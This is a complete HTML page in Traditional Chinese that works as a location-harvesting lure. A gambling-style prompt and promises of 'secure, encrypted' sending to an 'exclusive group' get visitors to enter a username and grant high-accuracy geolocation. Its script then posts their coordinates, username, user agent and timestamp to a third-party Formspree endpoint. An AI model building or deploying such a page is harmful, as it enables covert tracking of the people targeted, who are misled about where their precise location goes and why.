<!doctype html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>獲取定位</title>
  <meta name="description" content="一鍵安全傳送座標，轉移到專屬群組。" />
  <meta name="color-scheme" content="light dark" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Noto+Sans+TC:wght@400;600;700&display=swap" rel="stylesheet" />
  <style>
    /* === 保留原有樣式 === */
    :root {
      --bg: #0b0b12;
      --bg2:#0f1020;
      --ink: #eaeaff;
      --muted:#a6a6c9;
      --accent:#8b7bff;
      --accent-2:#ffe94d;
      --success:#42d392;
      --danger:#ff6b6b;
      --ring: 0 0 0 .12rem rgba(139,123,255,.45), 0 0 1.4rem rgba(139,123,255,.35);
      --shadow: 0 10px 40px rgba(0,0,0,.35);
      --radius: 16px;
    }
    body {
      margin: 0; min-height: 100svh;
      font-family: "Noto Sans TC","Inter",sans-serif;
      color: var(--ink);
      background: linear-gradient(180deg, var(--bg), var(--bg2));
      display: grid; place-items: center;
    }
    .wrap {
      width: min(600px, 92vw);
      background: rgba(255,255,255,.08);
      border-radius: var(--radius);
      padding: 24px;
      box-shadow: var(--shadow);
      backdrop-filter: blur(10px);
    }
    h1 { margin: 0 0 10px; }
    p.lead { color: var(--muted); }
    .actions { margin-top: 14px; }
    input {
      width: 100%; padding: 12px; margin-bottom: 12px;
      border-radius: 8px; border: 1px solid rgba(255,255,255,.2);
      font-size: 1rem; background: rgba(255,255,255,.05); color: var(--ink);
    }
    button {
      width: 100%; padding: 14px; font-size: 1.05rem;
      border: none; border-radius: 10px; font-weight: 600;
      cursor: pointer;
      background: linear-gradient(135deg, var(--accent), var(--accent-2));
      color: #0f0f17;
      transition: opacity .25s;
    }
    button:disabled {
      opacity: 0.5; cursor: not-allowed;
    }
    #status { margin-top: 14px; font-weight: 600; color: var(--muted); }
    .ok { color: var(--success); }
    .bad { color: var(--danger); }
  </style>
</head>
<body>
  <main class="wrap">
    <h1>確認地址⬇️</h1>
    <p class="lead">請先輸入使用者名稱，並授權定位後，我會加密傳送到伺服器。</p>

    <!-- 新增使用者名稱輸入 -->
    <input type="text" id="username" placeholder="請輸入使用者名稱" />

    <div class="actions">
      <button id="sendLocationBtn" disabled>傳送地址</button>
    </div>

    <div id="status">想輸贏請先輸入名稱再點擊上方按鍵！</div>

    <section id="result" class="result">
      <div><strong>座標：</strong><span id="coords">—</span></div>
    </section>
  </main>

  <script>
    const usernameInput = document.getElementById('username');
    const btnSend = document.getElementById('sendLocationBtn');
    const statusEl = document.getElementById('status');
    const coordsEl = document.getElementById('coords');
    const result = document.getElementById('result');

    const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xnndkpja';

    // 只有輸入名稱才啟用按鈕
    usernameInput.addEventListener('input', () => {
      btnSend.disabled = usernameInput.value.trim() === '';
    });

    function setLoading(loading) {
      btnSend.disabled = loading;
      btnSend.textContent = loading ? '傳送中…' : '傳送地址';
    }

    function updateResult(lat, lng) {
      coordsEl.textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
      result.style.display = 'block';
    }

    async function postJSON(url, data) {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json','Accept':'application/json' },
        body: JSON.stringify(data)
      });
      return res.ok;
    }

    async function sendLocationFlow() {
      if (!('geolocation' in navigator)) {
        statusEl.textContent = '抱歉，瀏覽器不支援定位功能。';
        return;
      }
      setLoading(true);

      navigator.geolocation.getCurrentPosition(async pos => {
        const { latitude, longitude } = pos.coords;
        const payload = {
          username: usernameInput.value.trim(),
          latitude, longitude,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        };

        const ok = await postJSON(FORMSPREE_ENDPOINT, payload);
        updateResult(latitude, longitude);

        if (ok) {
          statusEl.textContent = '✓ 已送出：' + payload.username;
          statusEl.className = 'ok';
        } else {
          statusEl.textContent = '送出失敗，請稍後再試。';
          statusEl.className = 'bad';
        }
        setLoading(false);
      }, err => {
        statusEl.textContent = '定位失敗：' + err.message;
        setLoading(false);
      }, { enableHighAccuracy:true, timeout:10000 });
    }

    btnSend.addEventListener('click', sendLocationFlow);
  </script>
</body>
</html>